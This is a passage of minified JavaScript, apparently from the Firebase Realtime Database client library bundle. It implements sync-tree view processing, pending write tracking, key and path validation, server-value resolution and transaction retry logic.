                      if (eq(n) || ".priority" === eP(n)) {
                        let u;
                        if (t.serverCache.isFullyInitialized())
                          u = tQ(i, tF(t));
                        else {
                          let c = t.serverCache.getNode();
                          (0, y.hu)(
                            c instanceof e9,
                            "serverChildren would be complete if leaf node"
                          ),
                            (u = tX(i, c));
                        }
                        l = e.filter.updateFullNode(h, u, s);
                      } else {
                        let d = eP(n),
                          _ = t0(i, d, t.serverCache);
                        null == _ &&
                          t.serverCache.isCompleteForChild(d) &&
                          (_ = h.getImmediateChild(d)),
                          (l =
                            null != _
                              ? e.filter.updateChild(h, d, _, eR(n), a, s)
                              : t.eventCache.getNode().hasChild(d)
                              ? e.filter.updateChild(
                                  h,
                                  d,
                                  e9.EMPTY_NODE,
                                  eR(n),
                                  a,
                                  s
                                )
                              : h).isEmpty() &&
                            t.serverCache.isFullyInitialized() &&
                            (o = tQ(i, tF(t))).isLeafNode() &&
                            (l = e.filter.updateFullNode(l, o, s));
                      }
                      return (
                        (o =
                          t.serverCache.isFullyInitialized() ||
                          null != tZ(i, eS())),
                        tR(t, l, o, e.filter.filtersNodes())
                      );
                    }
                  })(e, t, n.path, i, r, l)
                : (function (e, t, n, i, r, s, o) {
                    if (null != tZ(r, n)) return t;
                    let l = t.serverCache.isFiltered(),
                      a = t.serverCache;
                    if (null != i.value) {
                      if (
                        (eq(n) && a.isFullyInitialized()) ||
                        a.isCompleteForPath(n)
                      )
                        return t8(e, t, n, a.getNode().getChild(n), r, s, l, o);
                      if (!eq(n)) return t;
                      {
                        let h = new tq(null);
                        return (
                          a.getNode().forEachChild(eG, (e, t) => {
                            h = h.set(new eN(e), t);
                          }),
                          nt(e, t, n, h, r, s, l, o)
                        );
                      }
                    }
                    {
                      let u = new tq(null);
                      return (
                        i.foreach((e, t) => {
                          let i = eA(n, e);
                          a.isCompleteForPath(i) &&
                            (u = u.set(e, a.getNode().getChild(i)));
                        }),
                        nt(e, t, n, u, r, s, l, o)
                      );
                    }
                  })(e, t, n.path, n.affectedTree, i, r, l);
            else {
              if (n.type !== f.LISTEN_COMPLETE)
                throw (0, y.g5)("Unknown operation type: " + n.type);
              s = (function (e, t, n, i, r) {
                let s = t.serverCache;
                return t6(
                  e,
                  tD(
                    t,
                    s.getNode(),
                    s.isFullyInitialized() || eq(n),
                    s.isFiltered()
                  ),
                  n,
                  i,
                  t4,
                  r
                );
              })(e, t, n.path, i, l);
            }
            let c = l.getChanges();
            return (
              (function (e, t, n) {
                let i = t.eventCache;
                if (i.isFullyInitialized()) {
                  let r = i.getNode().isLeafNode() || i.getNode().isEmpty(),
                    s = tM(e);
                  (!(n.length > 0) &&
                    e.eventCache.isFullyInitialized() &&
                    (!r || i.getNode().equals(s)) &&
                    i.getNode().getPriority().equals(s.getPriority())) ||
                    n.push(tr(tM(t)));
                }
              })(t, s, c),
              { viewCache: s, changes: c }
            );
          })(e.processor_, o, t, n, i);
        return (
          (r = e.processor_),
          (s = l.viewCache),
          (0, y.hu)(
            s.eventCache.getNode().isIndexed(r.filter.getIndex()),
            "Event snap not indexed"
          ),
          (0, y.hu)(
            s.serverCache.getNode().isIndexed(r.filter.getIndex()),
            "Server snap not indexed"
          ),
          (0, y.hu)(
            l.viewCache.serverCache.isFullyInitialized() ||
              !o.serverCache.isFullyInitialized(),
            "Once a server snap is complete, it should never go back"
          ),
          (e.viewCache_ = l.viewCache),
          no(e, l.changes, l.viewCache.eventCache.getNode(), null)
        );
      }
      function no(e, t, n, i) {
        let r = i ? [i] : e.eventRegistrations_;
        return (function (e, t, n, i) {
          let r = [],
            s = [];
          return (
            t.forEach((t) => {
              var n;
              "child_changed" === t.type &&
                e.index_.indexedValueChanged(t.oldSnap, t.snapshotNode) &&
                s.push(
                  ((n = t.childName),
                  {
                    type: "child_moved",
                    snapshotNode: t.snapshotNode,
                    childName: n,
                  })
                );
            }),
            tP(e, r, "child_removed", t, i, n),
            tP(e, r, "child_added", t, i, n),
            tP(e, r, "child_moved", s, i, n),
            tP(e, r, "child_changed", t, i, n),
            tP(e, r, "value", t, i, n),
            r
          );
        })(e.eventGenerator_, t, n, r);
      }
      class nl {
        constructor() {
          this.views = new Map();
        }
      }
      function na(e, t, n, i) {
        let r = t.source.queryId;
        if (null !== r) {
          let s = e.views.get(r);
          return (
            (0, y.hu)(
              null != s,
              "SyncTree gave us an op for an invalid query."
            ),
            ns(s, t, n, i)
          );
        }
        {
          let o = [];
          for (let l of e.views.values()) o = o.concat(ns(l, t, n, i));
          return o;
        }
      }
      function nh(e) {
        let t = [];
        for (let n of e.views.values())
          n.query._queryParams.loadsAllData() || t.push(n);
        return t;
      }
      function nu(e, t) {
        let n = null;
        for (let i of e.views.values())
          n =
            n ||
            (function (e, t) {
              let n = tF(e.viewCache_);
              return n &&
                (e.query._queryParams.loadsAllData() ||
                  (!eq(t) && !n.getImmediateChild(eP(t)).isEmpty()))
                ? n.getChild(t)
                : null;
            })(i, t);
        return n;
      }
      function nc(e, t) {
        if (t._queryParams.loadsAllData()) return n_(e);
        {
          let i = t._queryIdentifier;
          return e.views.get(i);
        }
      }
      function nd(e) {
        return null != n_(e);
      }
      function n_(e) {
        for (let t of e.views.values())
          if (t.query._queryParams.loadsAllData()) return t;
        return null;
      }
      let np = 1;
      class nf {
        constructor(e) {
          (this.listenProvider_ = e),
            (this.syncPointTree_ = new tq(null)),
            (this.pendingWriteTree_ = {
              visibleWrites: tL.empty(),
              allWrites: [],
              lastWriteId: -1,
            }),
            (this.tagToQueryMap = new Map()),
            (this.queryToTagMap = new Map());
        }
      }
      function ng(e, t, n, i, r) {
        var s, o;
        return (
          (s = e.pendingWriteTree_),
          (o = r),
          (0, y.hu)(
            i > s.lastWriteId,
            "Stacking an older write on top of newer ones"
          ),
          void 0 === o && (o = !0),
          s.allWrites.push({ path: t, snap: n, writeId: i, visible: o }),
          o && (s.visibleWrites = tO(s.visibleWrites, t, n)),
          (s.lastWriteId = i),
          r
            ? nT(
                e,
                new tb(
                  { fromUser: !0, fromServer: !1, queryId: null, tagged: !1 },
                  t,
                  n
                )
              )
            : []
        );
      }
      function nm(e, t, n = !1) {
        let i = (function (e, t) {
            for (let n = 0; n < e.allWrites.length; n++) {
              let i = e.allWrites[n];
              if (i.writeId === t) return i;
            }
            return null;
          })(e.pendingWriteTree_, t),
          r = (function (e, t) {
            let n = e.allWrites.findIndex((e) => e.writeId === t);
            (0, y.hu)(n >= 0, "removeWrite called with nonexistent writeId.");
            let i = e.allWrites[n];
            e.allWrites.splice(n, 1);
            let r = i.visible,
              s = !1,
              o = e.allWrites.length - 1;
            for (; r && o >= 0; ) {
              let l = e.allWrites[o];
              l.visible &&
                (o >= n &&
                (function (e, t) {
                  if (e.snap) return eW(e.path, t);
                  for (let n in e.children)
                    if (e.children.hasOwnProperty(n) && eW(eA(e.path, n), t))
                      return !0;
                  return !1;
                })(l, i.path)
                  ? (r = !1)
                  : eW(i.path, l.path) && (s = !0)),
                o--;
            }
            if (!r) return !1;
            var a;
            if (s)
              return (
                ((a = e).visibleWrites = tG(a.allWrites, tK, eS())),
                a.allWrites.length > 0
                  ? (a.lastWriteId =
                      a.allWrites[a.allWrites.length - 1].writeId)
                  : (a.lastWriteId = -1),
                !0
              );
            if (i.snap) e.visibleWrites = tU(e.visibleWrites, i.path);
            else {
              X(i.children, (t) => {
                e.visibleWrites = tU(e.visibleWrites, eA(i.path, t));
              });
            }
            return !0;
          })(e.pendingWriteTree_, t);
        if (!r) return [];
        {
          let s = new tq(null);
          return (
            null != i.snap
              ? (s = s.set(eS(), !0))
              : X(i.children, (e) => {
                  s = s.set(new eN(e), !0);
                }),
            nT(e, new tI(i.path, s, n))
          );
        }
      }
      function ny(e, t, n) {
        return nT(
          e,
          new tb(
            { fromUser: !1, fromServer: !0, queryId: null, tagged: !1 },
            t,
            n
          )
        );
      }
      function nv(e, t, n, i, r = !1) {
        let s = t._path,
          o = e.syncPointTree_.get(s),
          l = [];
        if (o && ("default" === t._queryIdentifier || null != nc(o, t))) {
          let a = (function (e, t, n, i) {
            let r = t._queryIdentifier,
              s = [],
              o = [],
              l = nd(e);
            if ("default" === r)
              for (let [a, h] of e.views.entries())
                (o = o.concat(nr(h, n, i))),
                  ni(h) &&
                    (e.views.delete(a),
                    h.query._queryParams.loadsAllData() || s.push(h.query));
            else {
              let u = e.views.get(r);
              u &&
                ((o = o.concat(nr(u, n, i))),
                ni(u) &&
                  (e.views.delete(r),
                  u.query._queryParams.loadsAllData() || s.push(u.query)));
            }
            return (
              l &&
                !nd(e) &&
                s.push(
                  new ((0, y.hu)(c, "Reference.ts has not been loaded"), c)(
                    t._repo,
                    t._path
                  )
                ),
              { removed: s, events: o }
            );
          })(o, t, n, i);
          0 === o.views.size && (e.syncPointTree_ = e.syncPointTree_.remove(s));
          let h = a.removed;
          if (((l = a.events), !r)) {
            let u = -1 !== h.findIndex((e) => e._queryParams.loadsAllData()),
              d = e.syncPointTree_.findOnPath(s, (e, t) => nd(t));
            if (u && !d) {
              let _ = e.syncPointTree_.subtree(s);
              if (!_.isEmpty()) {
                let p = _.fold((e, t, n) => {
                  if (t && nd(t)) {
                    return [n_(t)];
                  }
                  {
                    let r = [];
                    return (
                      t && (r = nh(t)),
                      X(n, (e, t) => {
                        r = r.concat(t);
                      }),
                      r
                    );
                  }
                });
                for (let f = 0; f < p.length; ++f) {
                  let g = p[f],
                    m = g.query,
                    v = nI(e, g);
                  e.listenProvider_.startListening(
                    nP(m),
                    nk(e, m),
                    v.hashFn,
                    v.onComplete
                  );
                }
              }
            }
            d ||
              !(h.length > 0) ||
              i ||
              (u
                ? e.listenProvider_.stopListening(nP(t), null)
                : h.forEach((t) => {
                    let n = e.queryToTagMap.get(nb(t));
                    e.listenProvider_.stopListening(nP(t), n);
                  }));
          }
          !(function (e, t) {
            for (let n = 0; n < t.length; ++n) {
              let i = t[n];
              if (!i._queryParams.loadsAllData()) {
                let r = nb(i),
                  s = e.queryToTagMap.get(r);
                e.queryToTagMap.delete(r), e.tagToQueryMap.delete(s);
              }
            }
          })(e, h);
        }
        return l;
      }
      function nC(e, t, n, i = !1) {
        var r;
        let s,
          o = t._path,
          l = null,
          a = !1;
        e.syncPointTree_.foreachOnPath(o, (e, t) => {
          let n = eL(e, o);
          (l = l || nu(t, n)), (a = a || nd(t));
        });
        let h = e.syncPointTree_.get(o);
        if (
          (h
            ? ((a = a || nd(h)), (l = l || nu(h, eS())))
            : ((h = new nl()), (e.syncPointTree_ = e.syncPointTree_.set(o, h))),
          null != l)
        )
          s = !0;
        else {
          (s = !1),
            (l = e9.EMPTY_NODE),
            e.syncPointTree_.subtree(o).foreachChild((e, t) => {
              let n = nu(t, eS());
              n && (l = l.updateImmediateChild(e, n));
            });
        }
        let c = null != nc(h, t);
        if (!c && !t._queryParams.loadsAllData()) {
          let d = nb(t);
          (0, y.hu)(
            !e.queryToTagMap.has(d),
            "View does not exist, but we have a tag"
          );
          let _ = np++;
          e.queryToTagMap.set(d, _), e.tagToQueryMap.set(_, d);
        }
        let f = (function (e, t, n, i, r, s) {
          let o = (function (e, t, n, i, r) {
            let s = t._queryIdentifier,
              o = e.views.get(s);
            if (!o) {
              let l = tQ(n, r ? i : null),
                a = !1;
              l
                ? (a = !0)
                : i instanceof e9
                ? ((l = tX(n, i)), (a = !1))
                : ((l = e9.EMPTY_NODE), (a = !1));
              let h = tx(new tN(l, a, !1), new tN(i, r, !1));
              return new nn(t, h);
            }
            return o;
          })(e, t, i, r, s);
          return (
            e.views.has(t._queryIdentifier) ||
              e.views.set(t._queryIdentifier, o),
            (function (e, t) {
              e.eventRegistrations_.push(t);
            })(o, n),
            (function (e, t) {
              let n = e.viewCache_.eventCache,
                i = [];
              if (!n.getNode().isLeafNode()) {
                n.getNode().forEachChild(e2, (e, t) => {
                  i.push(ts(e, t));
                });
              }
              return (
                n.isFullyInitialized() && i.push(tr(n.getNode())),
                no(e, i, n.getNode(), t)
              );
            })(o, n)
          );
        })(h, t, n, ((r = e.pendingWriteTree_), t3(o, r)), l, s);
        if (!c && !a && !i) {
          let g = nc(h, t);
          f = f.concat(
            (function (e, t, n) {
              let i = t._path,
                r = nk(e, t),
                s = nI(e, n),
                o = e.listenProvider_.startListening(
                  nP(t),
                  r,
                  s.hashFn,
                  s.onComplete
                ),
                l = e.syncPointTree_.subtree(i);
              if (r)
                (0, y.hu)(
                  !nd(l.value),
                  "If we're adding a query, it shouldn't be shadowed"
                );
              else {
                let a = l.fold((e, t, n) => {
                  if (!eq(e) && t && nd(t)) return [n_(t).query];
                  {
                    let i = [];
                    return (
                      t && (i = i.concat(nh(t).map((e) => e.query))),
                      X(n, (e, t) => {
                        i = i.concat(t);
                      }),
                      i
                    );
                  }
                });
                for (let h = 0; h < a.length; ++h) {
                  let u = a[h];
                  e.listenProvider_.stopListening(nP(u), nk(e, u));
                }
              }
              return o;
            })(e, t, g)
          );
        }
        return f;
      }
      function nw(e, t, n) {
        let i = e.pendingWriteTree_,
          r = e.syncPointTree_.findOnPath(t, (e, n) => {
            let r = nu(n, eL(e, t));
            if (r) return r;
          });
        return t$(i, t, r, n, !0);
      }
      function nT(e, t) {
        var n;
        return (function e(t, n, i, r) {
          if (eq(t.path))
            return (function e(t, n, i, r) {
              let s = n.get(eS());
              null == i && null != s && (i = nu(s, eS()));
              let o = [];
              return (
                n.children.inorderTraversal((n, s) => {
                  let l = i ? i.getImmediateChild(n) : null,
                    a = t1(r, n),
                    h = t.operationForChild(n);
                  h && (o = o.concat(e(h, s, l, a)));
                }),
                s && (o = o.concat(na(s, t, r, i))),
                o
              );
            })(t, n, i, r);
          {
            let s = n.get(eS());
            null == i && null != s && (i = nu(s, eS()));
            let o = [],
              l = eP(t.path),
              a = t.operationForChild(l),
              h = n.children.get(l);
            if (h && a) {
              let u = i ? i.getImmediateChild(l) : null,
                c = t1(r, l);
              o = o.concat(e(a, h, u, c));
            }
            return s && (o = o.concat(na(s, t, r, i))), o;
          }
        })(t, e.syncPointTree_, null, ((n = e.pendingWriteTree_), t3(eS(), n)));
      }
      function nI(e, t) {
        let n = t.query,
          i = nk(e, n);
        return {
          hashFn: () =>
            (t.viewCache_.serverCache.getNode() || e9.EMPTY_NODE).hash(),
          onComplete: (t) => {
            var r;
            if ("ok" === t)
              return i
                ? (function (e, t, n) {
                    let i = nE(e, n);
                    if (!i) return [];
                    {
                      let r = nN(i),
                        s = r.path,
                        o = r.queryId,
                        l = eL(s, t);
                      return nS(e, s, new tk(tT(o), l));
                    }
                  })(e, n._path, i)
                : ((r = n._path),
                  nT(
                    e,
                    new tk(
                      {
                        fromUser: !1,
                        fromServer: !0,
                        queryId: null,
                        tagged: !1,
                      },
                      r
                    )
                  ));
            {
              let s = (function (e, t) {
                let n = "Unknown Error";
                "too_big" === e
                  ? (n =
                      "The data requested exceeds the maximum size that can be accessed with a single request.")
                  : "permission_denied" === e
                  ? (n =
                      "Client doesn't have permission to access the desired data.")
                  : "unavailable" === e && (n = "The service is unavailable");
                let i = Error(e + " at " + t._path.toString() + ": " + n);
                return (i.code = e.toUpperCase()), i;
              })(t, n);
              return nv(e, n, null, s);
            }
          },
        };
      }
      function nk(e, t) {
        let n = nb(t);
        return e.queryToTagMap.get(n);
      }
      function nb(e) {
        return e._path.toString() + "$" + e._queryIdentifier;
      }
      function nE(e, t) {
        return e.tagToQueryMap.get(t);
      }
      function nN(e) {
        let t = e.indexOf("$");
        return (
          (0, y.hu)(-1 !== t && t < e.length - 1, "Bad queryKey."),
          { queryId: e.substr(t + 1), path: new eN(e.substr(0, t)) }
        );
      }
      function nS(e, t, n) {
        let i = e.syncPointTree_.get(t);
        return (
          (0, y.hu)(i, "Missing sync point for query tag that we're tracking"),
          na(i, n, t3(t, e.pendingWriteTree_), null)
        );
      }
      function nP(e) {
        return e._queryParams.loadsAllData() && !e._queryParams.isDefault()
          ? new ((0, y.hu)(d, "Reference.ts has not been loaded"), d)(
              e._repo,
              e._path
            )
          : e;
      }
      class nx {
        constructor(e) {
          this.node_ = e;
        }
        getImmediateChild(e) {
          let t = this.node_.getImmediateChild(e);
          return new nx(t);
        }
        node() {
          return this.node_;
        }
      }
      class nR {
        constructor(e, t) {
          (this.syncTree_ = e), (this.path_ = t);
        }
        getImmediateChild(e) {
          let t = eA(this.path_, e);
          return new nR(this.syncTree_, t);
        }
        node() {
          return nw(this.syncTree_, this.path_);
        }
      }
      let nD = function (e, t, n) {
          return e && "object" == typeof e
            ? ((0, y.hu)(
                ".sv" in e,
                "Unexpected leaf node or priority contents"
              ),
              "string" == typeof e[".sv"]
                ? nM(e[".sv"], t, n)
                : "object" == typeof e[".sv"]
                ? nF(e[".sv"], t)
                : void (0, y.hu)(
                    !1,
                    "Unexpected server value: " + JSON.stringify(e, null, 2)
                  ))
            : e;
        },
        nM = function (e, t, n) {
          if ("timestamp" === e) return n.timestamp;
          (0, y.hu)(!1, "Unexpected server value: " + e);
        },
        nF = function (e, t, n) {
          e.hasOwnProperty("increment") ||
            (0, y.hu)(
              !1,
              "Unexpected server value: " + JSON.stringify(e, null, 2)
            );
          let i = e.increment;
          "number" != typeof i &&
            (0, y.hu)(!1, "Unexpected increment value: " + i);
          let r = t.node();
          if (
            ((0, y.hu)(null != r, "Expected ChildrenNode.EMPTY_NODE for nulls"),
            !r.isLeafNode())
          )
            return i;
          let s = r.getValue();
          return "number" != typeof s ? i : s + i;
        },
        nA = function (e, t, n) {
          return nq(e, new nx(t), n);
        };
      function nq(e, t, n) {
        let i,
          r = e.getPriority().val(),
          s = nD(r, t.getImmediateChild(".priority"), n);
        if (!e.isLeafNode())
          return (
            (i = e),
            s !== e.getPriority().val() && (i = i.updatePriority(new e3(s))),
            e.forEachChild(e2, (e, r) => {
              let s = nq(r, t.getImmediateChild(e), n);
              s !== r && (i = i.updateImmediateChild(e, s));
            }),
            i
          );
        {
          let o = nD(e.getValue(), t, n);
          return o !== e.getValue() || s !== e.getPriority().val()
            ? new e3(o, tt(s))
            : e;
        }
      }
      class nL {
        constructor(e = "", t = null, n = { children: {}, childCount: 0 }) {
          (this.name = e), (this.parent = t), (this.node = n);
        }
      }
      function nO(e, t) {
        let n = t instanceof eN ? t : new eN(t),
          i = e,
          r = eP(n);
        for (; null !== r; ) {
          let s = (0, y.DV)(i.node.children, r) || {
            children: {},
            childCount: 0,
          };
          (i = new nL(r, i, s)), (r = eP((n = eR(n))));
        }
        return i;
      }
      function nW(e) {
        return e.node.value;
      }
      function nU(e, t) {
        (e.node.value = t),
          (function e(t) {
            null !== t.parent &&
              (function (t, n, i) {
                let r = void 0 === nW(i) && !nH(i),
                  s = (0, y.r3)(t.node.children, n);
                r && s
                  ? (delete t.node.children[n], t.node.childCount--, e(t))
                  : r ||
                    s ||
                    ((t.node.children[n] = i.node), t.node.childCount++, e(t));
              })(t.parent, t.name, t);
          })(e);
      }
      function nH(e) {
        return e.node.childCount > 0;
      }
      function nY(e, t) {
        X(e.node.children, (n, i) => {
          t(new nL(n, e, i));
        });
      }
      function nj(e) {
        return new eN(null === e.parent ? e.name : nj(e.parent) + "/" + e.name);
      }
      let nV = /[\[\].#$\/\u0000-\u001F\u007F]/,
        nz = /[\[\].#$\u0000-\u001F\u007F]/,
        nB = function (e) {
          return "string" == typeof e && 0 !== e.length && !nV.test(e);
        },
        nK = function (e) {
          return "string" == typeof e && 0 !== e.length && !nz.test(e);
        },
        nG = function (e, t, n, i) {
          (i && void 0 === t) || n$((0, y.gK)(e, "value"), t, n);
        },
        n$ = function (e, t, n) {
          let i = n instanceof eN ? new eU(n, e) : n;
          if (void 0 === t) throw Error(e + "contains undefined " + eY(i));
          if ("function" == typeof t)
            throw Error(
              e +
                "contains a function " +
                eY(i) +
                " with contents = " +
                t.toString()
            );
          if (Y(t)) throw Error(e + "contains " + t.toString() + " " + eY(i));
          if (
            "string" == typeof t &&
            t.length > 3495253.3333333335 &&
            (0, y.ug)(t) > 10485760
          )
            throw Error(
              e +
                "contains a string greater than 10485760 utf8 bytes " +
                eY(i) +
                " ('" +
                t.substring(0, 50) +
                "...')"
            );
          if (t && "object" == typeof t) {
            let r = !1,
              s = !1;
            if (
              (X(t, (t, n) => {
                var o;
                if (".value" === t) r = !0;
                else if (".priority" !== t && ".sv" !== t && ((s = !0), !nB(t)))
                  throw Error(
                    e +
                      " contains an invalid key (" +
                      t +
                      ") " +
                      eY(i) +
                      '.  Keys must be non-empty strings and can\'t contain ".", "#", "$", "/", "[", or "]"'
                  );
                (o = i).parts_.length > 0 && (o.byteLength_ += 1),
                  o.parts_.push(t),
                  (o.byteLength_ += (0, y.ug)(t)),
                  eH(o),
                  n$(e, n, i),
                  (function (e) {
                    let t = e.parts_.pop();
                    (e.byteLength_ -= (0, y.ug)(t)),
                      e.parts_.length > 0 && (e.byteLength_ -= 1);
                  })(i);
              }),
              r && s)
            )
              throw Error(
                e +
                  ' contains ".value" child ' +
                  eY(i) +
                  " in addition to actual children."
              );
          }
        },
        nQ = function (e, t, n, i) {
          if (!((i && void 0 === n) || nK(n)))
            throw Error(
              (0, y.gK)(e, t) +
                'was an invalid path = "' +
                n +
                '". Paths must be non-empty strings and can\'t contain ".", "#", "$", "[", or "]"'
            );
        },
        nX = function (e, t, n, i) {
          n && (n = n.replace(/^\/*\.info(\/|$)/, "/")), nQ(e, t, n, i);
        },
        nJ = function (e, t) {
          if (".info" === eP(t))
            throw Error(e + " failed = Can't modify data under /.info/");
        };
      class n0 {
        constructor() {
          (this.eventLists_ = []), (this.recursionDepth_ = 0);
        }
      }
      function n1(e, t) {
        let n = null;
        for (let i = 0; i < t.length; i++) {
          let r = t[i],
            s = r.getPath();
          null === n || eO(s, n.path) || (e.eventLists_.push(n), (n = null)),
            null === n && (n = { events: [], path: s }),
            n.events.push(r);
        }
        n && e.eventLists_.push(n);
      }
      function n3(e, t, n) {
        n1(e, n), n4(e, (e) => eO(e, t));
      }
      function n2(e, t, n) {
        n1(e, n), n4(e, (e) => eW(e, t) || eW(t, e));
      }
      function n4(e, t) {
        e.recursionDepth_++;
        let n = !0;
        for (let i = 0; i < e.eventLists_.length; i++) {
          let r = e.eventLists_[i];
          if (r) {
            t(r.path)
              ? ((function (e) {
                  for (let t = 0; t < e.events.length; t++) {
                    let n = e.events[t];
                    if (null !== n) {
                      e.events[t] = null;
                      let i = n.getEventRunner();
                      M && q("event: " + n.toString()), et(i);
                    }
                  }
                })(e.eventLists_[i]),
                (e.eventLists_[i] = null))
              : (n = !1);
          }
        }
        n && (e.eventLists_ = []), e.recursionDepth_--;
      }
      class n5 {
        constructor(e, t, n, i) {
          (this.repoInfo_ = e),
            (this.forceRestClient_ = t),
            (this.authTokenProvider_ = n),
            (this.appCheckProvider_ = i),
            (this.dataUpdateCount = 0),
            (this.statsListener_ = null),
            (this.eventQueue_ = new n0()),
            (this.nextWriteId_ = 1),
            (this.interceptServerDataCallback_ = null),
            (this.onDisconnect_ = tg()),
            (this.transactionQueueTree_ = new nL()),
            (this.persistentConnection_ = null),
            (this.key = this.repoInfo_.toURLString());
        }
        toString() {
          return (
            (this.repoInfo_.secure ? "https://" : "http://") +
            this.repoInfo_.host
          );
        }
      }
      function n6(e) {
        let n =
          e.infoData_.getNode(new eN(".info/serverTimeOffset")).val() || 0;
        return new Date().getTime() + n;
      }
      function n8(e) {
        var t;
        return (
          ((t = t = { timestamp: n6(e) }).timestamp =
            t.timestamp || new Date().getTime()),
          t
        );
      }
      function n7(e, t, n, i, r) {
        e.dataUpdateCount++;
        let s = new eN(t);
        n = e.interceptServerDataCallback_
          ? e.interceptServerDataCallback_(t, n)
          : n;
        let o = [];
        if (r)
          if (i) {
            let l = (0, y.UI)(n, (e) => tt(e));
            o = (function (e, t, n, i) {
              let r = nE(e, i);
              if (!r) return [];
              {
                let s = nN(r),
                  o = s.path,
                  l = s.queryId,
                  a = eL(o, t),
                  h = tq.fromObject(n);
                return nS(e, o, new tE(tT(l), a, h));
              }
            })(e.serverSyncTree_, s, l, r);
          } else {
            let a = tt(n);
            o = (function (e, t, n, i) {
              let r = nE(e, i);
              if (null == r) return [];
              {
                let s = nN(r),
                  o = s.path,
                  l = s.queryId,
                  a = eL(o, t);
                return nS(e, o, new tb(tT(l), a, n));
              }
            })(e.serverSyncTree_, s, a, r);
          }
        else if (i) {
          let h = (0, y.UI)(n, (e) => tt(e));
          o = (function (e, t, n) {
            let i = tq.fromObject(n);
            return nT(
              e,
              new tE(
                { fromUser: !1, fromServer: !0, queryId: null, tagged: !1 },
                t,
                i
              )
            );
          })(e.serverSyncTree_, s, h);
        } else {
          let u = tt(n);
          o = ny(e.serverSyncTree_, s, u);
        }
        let c = s;
        o.length > 0 && (c = io(e, s)), n2(e.eventQueue_, c, o);
      }
      function n9(e, t) {
        ie(e, "connected", t),
          !1 === t &&
            (function (e) {
              ir(e, "onDisconnectEvents");
              let t = n8(e),
                n = tg();
              tm(e.onDisconnect_, eS(), (i, r) => {
                var s;
                let o = ((s = e.serverSyncTree_), nq(r, new nR(s, i), t));
                !(function e(t, n, i) {
                  if (eq(n)) (t.value = i), t.children.clear();
                  else if (null !== t.value)
                    t.value = t.value.updateChild(n, i);
                  else {
                    let r = eP(n);
                    t.children.has(r) || t.children.set(r, tg()),
                      e(t.children.get(r), (n = eR(n)), i);
                  }
                })(n, i, o);
              });
              let i = [];
              tm(n, eS(), (t, n) => {
                i = i.concat(ny(e.serverSyncTree_, t, n));
                let r = iu(e, t);
                io(e, r);
              }),
                (e.onDisconnect_ = tg()),
                n2(e.eventQueue_, eS(), i);
            })(e);
      }
      function ie(e, t, n) {
        let i = new eN("/.info/" + t),
          r = tt(n);
        e.infoData_.updateSnapshot(i, r);
        let s = ny(e.infoSyncTree_, i, r);
        n2(e.eventQueue_, i, s);
      }
      function it(e) {
        return e.nextWriteId_++;
      }
      function ii(e, t, n) {
        let i;
        (i =
          ".info" === eP(t._path)
            ? nv(e.infoSyncTree_, t, n)
            : nv(e.serverSyncTree_, t, n)),
          n3(e.eventQueue_, t._path, i);
      }
      function ir(e, ...t) {
        let n = "";
        e.persistentConnection_ && (n = e.persistentConnection_.id + ":"),
          q(n, ...t);
      }
      function is(e, t, n) {
        return nw(e.serverSyncTree_, t, n) || e9.EMPTY_NODE;
      }
      function io(e, t) {
        let n = il(e, t),
          i = nj(n);
        return (
          (function (e, t, n) {
            if (0 === t.length) return;
            let i = [],
              r = [],
              s = t.filter((e) => 0 === e.status),
              o = s.map((e) => e.currentWriteId);
            for (let l = 0; l < t.length; l++) {
              let c,
                a = t[l],
                h = eL(n, a.path),
                u = !1;
              if (
                ((0, y.hu)(
                  null !== h,
                  "rerunTransactionsUnderNode_: relativePath should not be null."
                ),
                4 === a.status)
              )
                (u = !0),
                  (c = a.abortReason),
                  (r = r.concat(nm(e.serverSyncTree_, a.currentWriteId, !0)));
              else if (0 === a.status)
                if (a.retryCount >= 25)
                  (u = !0),
                    (c = "maxretry"),
                    (r = r.concat(nm(e.serverSyncTree_, a.currentWriteId, !0)));
                else {
                  let d = is(e, a.path, o);
                  a.currentInputSnapshot = d;
                  let _ = t[l].update(d.val());
                  if (void 0 !== _) {
                    n$("transaction failed: Data returned ", _, a.path);
                    let p = tt(_);
                    ("object" == typeof _ &&
                      null != _ &&
                      (0, y.r3)(_, ".priority")) ||
                      (p = p.updatePriority(d.getPriority()));
                    let g = a.currentWriteId,
                      m = n8(e),
                      v = nA(p, d, m);
                    (a.currentOutputSnapshotRaw = p),
                      (a.currentOutputSnapshotResolved = v),
                      (a.currentWriteId = it(e)),
                      o.splice(o.indexOf(g), 1),
                      (r = (r = r.concat(
                        ng(
                          e.serverSyncTree_,
                          a.path,
                          v,
                          a.currentWriteId,
                          a.applyLocally
                        )
                      )).concat(nm(e.serverSyncTree_, g, !0)));
                  } else
                    (u = !0),
                      (c = "nodata"),
                      (r = r.concat(
                        nm(e.serverSyncTree_, a.currentWriteId, !0)
                      ));
                }
              n2(e.eventQueue_, n, r),
                (r = []),
                u &&
                  ((t[l].status = 2),
                  setTimeout(t[l].unwatcher, Math.floor(0)),
                  t[l].onComplete &&
                    ("nodata" === c
                      ? i.push(() =>
                          t[l].onComplete(null, !1, t[l].currentInputSnapshot)
                        )
                      : i.push(() => t[l].onComplete(Error(c), !1, null))));
            }
            ih(e, e.transactionQueueTree_);
            for (let C = 0; C < i.length; C++) et(i[C]);
            !(function e(t, n = t.transactionQueueTree_) {
              if ((n || ih(t, n), nW(n))) {
                let i = ia(t, n);
                (0, y.hu)(
                  i.length > 0,
                  "Sending zero length transaction queue"
                );
                let r = i.every((e) => 0 === e.status);
                r &&
                  (function (t, n, i) {
                    let r = i.map((e) => e.currentWriteId),
                      s = is(t, n, r),
                      o = s,
                      l = s.hash();
                    for (let a = 0; a < i.length; a++) {
                      let h = i[a];
                      (0, y.hu)(
                        0 === h.status,
                        "tryToSendTransactionQueue_: items in queue should all be run."
                      ),
                        (h.status = 1),
                        h.retryCount++;
                      let u = eL(n, h.path);
                      o = o.updateChild(u, h.currentOutputSnapshotRaw);
                    }
                    let c = o.val(!0);
                    t.server_.put(
                      n.toString(),
                      c,
                      (r) => {
                        ir(t, "transaction put response", {
                          path: n.toString(),
                          status: r,
                        });
                        let s = [];
                        if ("ok" === r) {
                          let o = [];
                          for (let l = 0; l < i.length; l++)
                            (i[l].status = 2),
                              (s = s.concat(
                                nm(t.serverSyncTree_, i[l].currentWriteId)
                              )),
                              i[l].onComplete &&
                                o.push(() =>
                                  i[l].onComplete(
                                    null,
                                    !0,
                                    i[l].currentOutputSnapshotResolved
                                  )
                                ),
                              i[l].unwatcher();
                          ih(t, nO(t.transactionQueueTree_, n)),
                            e(t, t.transactionQueueTree_),
                            n2(t.eventQueue_, n, s);
